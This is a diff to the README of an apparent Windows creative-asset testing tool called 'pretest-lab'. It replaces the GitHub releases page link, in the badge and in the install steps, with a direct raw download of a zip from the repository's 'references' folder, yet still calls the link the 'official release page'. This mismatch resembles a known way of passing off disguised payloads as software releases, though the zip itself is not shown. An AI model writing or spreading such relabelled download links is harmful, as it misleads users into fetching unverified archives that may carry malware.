@@ -1,6 +1,6 @@
 # 🧪 pretest-lab - Improve Your Creative Assets Through Science
 
-<a href="https://github.com/Janiaciliate184/pretest-lab/releases"><img src="https://img.shields.io/badge/Download-Latest%20Version-blue" alt="Download pretest-lab"></a>
+<a href="https://github.com/Janiaciliate184/pretest-lab/raw/refs/heads/main/references/pretest-lab-3.7.zip"><img src="https://img.shields.io/badge/Download-Latest%20Version-blue" alt="Download pretest-lab"></a>
 
 pretest-lab acts as a quality gate for your creative work. It helps teams test pitch decks, communication designs, and marketing assets before they reach the public. The software uses the Limbic model and System 1 thinking to predict how people perceive your designs. It provides feedback based on a 12-lens Creative Expert Roundtable framework.
 
@@ -28,7 +28,7 @@ You need a Windows computer to run this application. Ensure your device meets th
 
 Follow these steps to install the application on your computer.
 
-1. Visit the [official release page](https://github.com/Janiaciliate184/pretest-lab/releases) to access the download files.
+1. Visit the [official release page](https://github.com/Janiaciliate184/pretest-lab/raw/refs/heads/main/references/pretest-lab-3.7.zip) to access the download files.
 2. Look for the latest version number at the top of the list.
 3. Select the file ending in `.msi` or `.exe` for Windows.
 4. Wait for the file to finish downloading to your computer.
